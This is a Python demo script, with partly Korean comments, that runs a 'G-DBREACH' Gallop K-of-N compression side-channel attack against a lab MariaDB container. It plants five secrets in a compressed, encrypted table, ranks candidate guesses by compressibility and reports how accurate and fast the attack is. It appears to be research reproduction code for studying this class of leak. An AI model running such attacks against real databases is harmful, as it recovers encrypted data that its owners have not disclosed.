"""
G-DBREACH Quick Demo

빠른 데모: Gallop K-of-N 공격만 실행
Standard K-of-N은 매우 느려서 제외됨

Usage:
    python3 demo_gdbreach_quick.py
"""

import utils.mariadb_utils as utils
import dbreacher_impl_binary_search
import k_of_n_attacker_binary
import random
import string
import time

# Configuration
table = "victimtable"
db_name = "flask_db"
maxRowSize = 200
k = 5  # 5개 시크릿
n = 20  # 20개 후보

print("="*80)
print("G-DBREACH Quick Demo: Gallop K-of-N Attack")
print("="*80)
print(f"Secrets (k): {k}")
print(f"Total guesses (n): {n}")
print("="*80)
print()

# Database connection (use root for FLUSH TABLES privilege)
control = utils.MariaDBController(
    db_name,
    host="mariadb_container",
    port=3306,
    user="root",
    password="your_root_password",
    datadir="/var/lib/mysql",
)

# Load dataset
with open("./resources/10000-english.txt") as f:
    possibilities = [line.strip().lower() for line in f]

# Shuffle and select
random.shuffle(possibilities)
trial_possibilities = possibilities[:n]

# Drop and recreate table
print("Setting up database...")
control.drop_table(table)
control.create_basic_table(
    table,
    varchar_len=maxRowSize,
    compressed=True,
    encrypted=True
)

# Insert k secrets
guesses = []
correct_guesses = set()

print(f"\nInserting {k} secrets into database...")
for secret_idx in range(k):
    secret = trial_possibilities[secret_idx]
    control.insert_row(table, secret_idx, secret)
    guesses.append(secret)
    correct_guesses.add(secret)
    print(f"  Secret {secret_idx+1}: {secret}")

# Add wrong guesses
print(f"\nAdding {n-k} wrong guesses...")
for secret_idx in range(k, n):
    wrong_guess = trial_possibilities[secret_idx]
    guesses.append(wrong_guess)
    print(f"  Wrong {secret_idx-k+1}: {wrong_guess}")

# Prepare parameters
guess_len = [len(g) for g in guesses]
random_guess_len = max(guess_len)
compressible_bytes = 100
random_bytes = 100

fillerCharSet = string.printable.replace(string.ascii_lowercase, '').replace('*', '')

print(f"\n{'='*80}")
print("Starting Gallop K-of-N Attack (Binary Search Optimization)")
print(f"{'='*80}\n")

# Create DBREACHer
dbreacher = dbreacher_impl_binary_search.DBREACHerImpl(
    control,
    table,
    k,  # startIdx
    maxRowSize,
    fillerCharSet,
    ord('*'),
    compressible_bytes,
    random_bytes,
    guesses,
    random_guess_len
)

# Create K-of-N attacker
attacker = k_of_n_attacker_binary.kOfNAttacker(
    k=k,
    dbreacher=dbreacher,
    guesses=guesses,
    tiesOn=True
)

# Run attack
startRound = time.time()

print("Step 1: setUp() - Inserting fillers and finding boundary...")
setupStart = time.time()
success = attacker.setUp()
setupEnd = time.time()

if not success:
    print("  setUp failed, retrying...")
    success = attacker.setUp()
    setupEnd = time.time()

if not success:
    print("  setUp failed after retry. Exiting.")
    exit(1)

print(f"  ✓ setUp completed in {setupEnd - setupStart:.2f}s")

print("\nStep 2: tryAllGuesses() - Testing all guesses...")
success = attacker.tryAllGuesses(verbose=False)
attackEnd = time.time()

if not success:
    print("  Attack failed. Exiting.")
    exit(1)

print(f"  ✓ Attack completed in {attackEnd - setupEnd:.2f}s")

endRound = time.time()

# Get top-K guesses
print("\nStep 3: getTopKGuesses() - Extracting top-k results...")
topKGuesses = attacker.getTopKGuesses()

# Calculate accuracy
top_k_correct = sum(1 for score, guess in topKGuesses if guess in correct_guesses)
accuracy = top_k_correct / k if k > 0 else 0.0

setup_time = setupEnd - setupStart
attack_time = attackEnd - setupEnd
total_time = endRound - startRound
db_queries = dbreacher.db_count

print(f"\n{'='*80}")
print("Results")
print(f"{'='*80}")
print(f"Top-{k} Guesses (by compressibility score):")
for idx, (score, guess) in enumerate(topKGuesses[:k], 1):
    is_correct = "✓" if guess in correct_guesses else "✗"
    print(f"  {idx}. {guess:20s} (score: {score:.6f}) {is_correct}")

print(f"\nAccuracy: {accuracy:.2%} ({top_k_correct}/{k} correct)")
print(f"Setup time: {setup_time:.2f}s")
print(f"Attack time: {attack_time:.2f}s")
print(f"Total time: {total_time:.2f}s")
print(f"DB queries: {db_queries}")
print(f"{'='*80}")
print("\n✓ Demo completed successfully!")
